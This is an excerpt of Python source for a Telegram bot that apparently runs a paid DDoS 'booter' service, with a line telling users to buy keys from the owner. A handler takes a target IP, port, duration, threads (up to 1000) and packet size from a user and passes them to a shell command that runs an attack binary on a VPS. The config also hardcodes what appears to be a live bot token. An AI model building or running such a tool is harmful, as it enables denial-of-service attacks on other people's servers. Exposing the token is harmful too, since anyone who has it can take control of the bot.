...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '7818765930:AAHo9f4Uvri3z2hJq9IzWqM_2dCkRZvXWb4'
OWNER_USERNAME = "MR_NB_OWMER"
OWNER_CONTACT = "Contact @MR_NB_OWNER to buy keys"
ALLOWED_GROUP_IDS = [-1004797383043]
MAX_THREADS = 1000
max_duration = 180
packet_size = int(9)
bot_open = False
...
async def attack_input(update: Update, context: CallbackContext):
    ...
    if len(args) != 5:
    await update.message.reply_text(
        f"❌ *Invalid input! Please enter <ip> <port> <duration> <threads> <packet_size>*\n\n"
        f"👑 *Bot Owner:* @{OWNER_USERNAME}",
        parse_mode='Markdown'
    )
    return ConversationHandler.END
        ...
        try:
            ...
            if selected_vps:
                try:
                    ...
                    command = f"{BINARY_PATH} {ip} {port} {duration} {threads} {packet_size}"
                ...
                process = await asyncio.create_subprocess_shell(
                    f"{BINARY_PATH} {ip} {port} {duration} {threads} {packet_size}",
